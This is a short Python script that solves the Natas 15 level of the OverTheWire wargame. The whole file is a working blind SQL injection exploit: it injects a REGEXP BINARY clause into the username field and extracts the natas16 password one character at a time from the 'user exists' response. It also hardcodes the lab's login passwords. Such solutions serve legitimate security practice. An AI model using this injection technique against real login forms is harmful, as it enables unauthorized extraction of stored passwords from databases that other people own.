#!/bin/python3
# Password per natas16: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
import requests
import re

user = 'natas15'
password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
url = 'http://%s.natas.labs.overthewire.org/' % user


sessione = requests.Session()

query = 'natas16" and password REGEXP BINARY "^'
letter = '{}'
pass16 = ''

while True:

    for i in "abcdefghjkilmnopqrstuvxywzABCDEFGHIJKLMNOPQRSTUVXYWZ0123456789":
        r = query + letter.format(i)

        obj = {'username': r}
        post = sessione.post(url, data=obj, auth=(user, password))

        espr = re.findall("This user exists(.*)", post.text)

        if len(espr) > 0:
            query = query + i
            pass16 = pass16 + i

    if len(pass16) == 32:
        break

print(pass16)
